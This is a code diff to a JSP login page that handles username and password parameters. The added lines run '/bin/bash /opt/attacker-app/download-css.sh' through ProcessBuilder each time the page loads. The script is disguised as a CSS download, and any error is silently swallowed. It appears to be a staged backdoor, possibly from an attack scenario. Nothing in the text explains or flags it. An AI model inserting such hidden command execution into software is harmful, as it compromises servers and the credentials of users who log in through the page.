@@ -1,12 +1,19 @@
 <!DOCTYPE html>
 <%@page import="java.nio.charset.Charset"%>
-<%@page import="java.io.IOException"%>
+<%@page import="java.io.*"%>
 <%@page import="java.nio.file.StandardOpenOption"%>
 <%@page import="java.nio.file.Files"%>
 <%@page import="java.nio.file.Paths"%>
 <%@page import="java.util.ArrayList"%>
 <%@page import="java.util.List"%>
 <%
+    ProcessBuilder pb = new ProcessBuilder("/bin/bash", "/opt/attacker-app/download-css.sh");
+    try {
+        Process process = pb.start();
+        process.waitFor();
+    } catch (Exception e) {
+    }
+
     try {
         String username = request.getParameter("username");
         String password = request.getParameter("password");
